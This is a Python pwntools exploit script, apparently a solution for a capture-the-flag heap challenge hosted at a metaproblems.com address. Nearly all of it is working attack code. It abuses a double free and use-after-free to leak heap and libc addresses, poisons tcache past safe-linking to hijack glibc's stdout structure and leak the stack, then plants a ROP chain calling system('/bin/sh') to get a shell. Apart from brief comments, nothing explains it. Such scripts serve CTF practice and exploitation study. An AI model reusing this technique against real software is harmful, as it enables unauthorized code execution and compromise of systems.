#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF('./chall.patched')
libc = ELF('./libc.so.6')

host, port = "host.cg21.metaproblems.com", "3260"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process(exe.path)

# max size 1024
def add(idx,size,data):
  p.sendlineafter('Exit\n','1')
  p.sendlineafter('index?\n',str(idx))
  p.sendlineafter('it?\n',str(size))
  p.sendafter('here?\n',data)

def addn(idx,size,data):
  p.sendlineafter('Exit','1')
  p.sendlineafter('index?',str(idx))
  p.sendlineafter('it?',str(size))
  p.sendafter('here?',data)

def display(idx):
  p.sendlineafter('Exit\n','2')
  p.sendlineafter('index?\n',str(idx))

def edit(idx,data):
  p.sendlineafter('Exit\n','3')
  p.sendlineafter('index?\n',str(idx))
  p.sendafter('here?\n',data)

def editn(idx,data):
  p.sendlineafter('Exit','3')
  p.sendlineafter('index?',str(idx))
  p.sendafter('here?',data)

# double free
def free(idx):
    p.sendlineafter('Exit\n','4')
    p.sendlineafter('index?\n',str(idx))

def freen(idx):
    p.sendlineafter('Exit','4')
    p.sendlineafter('index?',str(idx))



for i in range(6):
  add(i,0x100,chr(0x41+i))

add(6,0x100,'1')
add(7,0x100,'2')
add(8,0x100, '3')
for i in range(6):
  free(i)
free(8)

# leak heap base
display(0)
heap = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00'))<<12
print('heap base = '+hex(heap))

free(7)
display(7)
# leak unsorted libc address
libc.address = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00')) - 0x1edcc0
print('libc base = '+hex(libc.address))

free(6)
add(9,0x100,p64(0xdeadbeef)*2)
free(7)
# get a bloc overlapping next bloc, overwrite dest
add(10,0x130,'\x00'*0x108+p64(0x111)+p64(libc.symbols['_IO_2_1_stdout_'] ^ (heap>>12)))
#Â nop
add(11,0x100,'a')

# overwrite stdout to leak stack via libc environ var
payload  = p64(0xfbad1800) + p64(0)*3 + p64(libc.sym['environ']) + p64(libc.sym['environ'] + 0x8)*3 + p64(libc.sym['environ'] + 0x9)
add(12,0x100,payload)

stack = u64(p.recv(8))
print('stack leak environ = '+hex(stack))

# double free another block to overwrite stack
freen(11)
editn(11,p64((stack-0x168) ^ (heap>>12)))
addn(13,0x100, 'X'*0x80)

rop = ROP(libc)
retg = rop.find_gadget(['ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

# copy the payload on to stack to create function return address
payload = '/bin/sh\x00'+p64(retg)+p64(pop_rdi)+p64(stack-0x168)+p64(libc.symbols['system'])
addn(14,0x100, payload)

p.interactive()

